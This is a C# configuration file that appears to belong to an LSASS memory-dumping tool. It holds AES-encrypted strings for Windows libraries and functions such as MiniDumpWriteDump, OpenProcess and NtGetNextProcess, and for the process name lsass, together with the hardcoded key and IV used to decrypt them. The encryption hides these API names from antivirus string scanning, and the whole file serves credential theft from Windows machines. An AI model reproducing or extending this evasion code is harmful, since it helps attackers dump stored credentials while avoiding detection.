using System;

namespace CustomD
{
    internal class Configuration
    {
        // AES Password and IV to encrypt the rest of strings in this file
        public static String strings_aes_password = "MSLegitimateStr.";
        public static String strings_aes_iv = "MSLegitimateStr.";

        // Encrypted Strings - Libraries
        public static String Kernel32_enc_str = "TplZ7bp6eKRpNJFVqU2MGQ==";  // Console.WriteLine(EncryptStringToBytes("kernel32.dll", Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv)));
        public static String Ntdll_enc_str = "jJptiuemvxJB64wbGBqt/A==";
        public static String Psapi_enc_str = "mMya9rZMB1jyVGpj2uoEGQ==";
        public static String Dbgcore_enc_str = "BVai7tBW8s6qrhZU05Wxhw==";
        // Encrypted Strings - Functions
        public static String MinidumpWriteDump_enc_str = "tFP++qWUzC+ytbpdRB43HWOR6V5Vx/24oI3/Hly5zG0=";
        public static String OpenProcess_enc_str = "kCrAtldSjJiMZ3Y1UPXZGw==";
        public static String LoadLibrary_enc_str = "EUYkQlZr1dktpF1kTL2yFA==";
        public static String GetProcessId_enc_str = "Wj2YEOtRIsHhjop0l7KQTQ==";
        public static String NtGetNextProcess_enc_str = "HxXQg0uk9rxKj5N/pZ2iylNspyROlBdOmtejmzGhbzI=";
        public static String GetProcessImageFileName_enc_str = "JDC1XQIn6rcQ6vgRB8zGOSPEdjsglveXVjH9SWUw1mo=";
        // Encrypted Strings - Process name
        public static String Lsass_enc_str = "+zIykYwm/RSRRs/svAVoag==";
    }
}
